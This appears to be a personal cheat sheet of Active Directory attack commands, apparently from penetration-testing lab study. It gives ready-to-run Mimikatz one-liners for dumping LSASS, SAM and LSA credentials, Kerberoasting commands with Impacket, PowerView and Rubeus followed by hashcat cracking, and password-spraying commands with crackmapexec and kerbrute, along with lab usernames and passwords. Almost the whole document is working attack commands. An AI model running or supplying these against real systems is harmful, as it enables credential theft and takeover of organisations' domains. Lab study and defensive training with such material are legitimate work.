## Active Directory Authentication

### Mimikatz

```
Cached Creds Storage -> Retrieve stored cache pass.

-> For Single Sign-on access, Pass hashses must be stored somewhere. It's stored in LSASS.
-> Access to LSASS needs admin level privs. Also they are encrypted with LSASS key.
-> We use mimikatz to dump LSASS.

1) mimikatz
# If we are local admin:
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords # Dumping hashes for logged on users using sekurlsa module.
# Crack the hashes now or Pass the Hash.

sekurlsa::tickets # Dumping TGT/TGS Tickets stored in memory.


Mimikatz One-Liner:

.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "token::elevate" "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

### Kerberoasting
```
Service Account Attack -> Kerberoasting attack.

# VERY USEFUL if the domain contains high-priv service account with weak pass.
# Abusing the service ticket and crack pass of service account in the Domain.

1) Impacket Method (REQUIRES PASS)
# This will take creds of a user, find kerberoastable users in the domain and then give us it's hash.
python3 GetUserSPNs.py <Domain>/<username>:<pass> -dc-ip <IP> -request
hashcat -m 13100 <hashes> /usr/share/wordlists/rockyou.txt --force
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt <hashes>

2) Powerview Method (WITHOUT PASS)
# Import Powerview script
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-NetUser -SPN | select serviceprincipalname # Replace SPN String Entirely below.
Request-SPNTicket -SPN "MSSQLSvc/xor-app23.xor.com:1433" -Format Hashcat

3) Rebues.exe
# Transfer Rebues.exe
.\Rubeus.exe kerberoast /outfile:hashes.kerberoas
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force

3) Manual Method (Nidem Article)
setspn -T medin -Q */* # Find SPN's of Kerbroastable users.
powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <'HTTP/CorpWebServer.corp.com'> # PUT SPN HERE.
klist # List all cached Kerberos tickets for current user.
```

### Additional Notes on Kerberoasting

```

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

cat hashes.kerberoast
hashcat --help | grep -i "Kerberos"

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

sudo impacket-GetUserSPNs -request -dc-ip 192.168.205.70 corp.com/pete

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force



```


### Password Spraying
```
# Try on each user found on each IP in the domain.
proxychains crackmapexec smb <IP> -u <user> -p <passoword>

# Google how to use this attack
net accounts # Check Lockout Threshold
.\Spray-Passwords.ps1 -Pass <password> -Admin # Will Spray password on all Admin accounts.
```

### Other Notes

```

xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.205.75
net accounts

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")

cd C:\Tools
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin


cat users.txt
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success


crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com

type .\usernames.txt
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"


Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```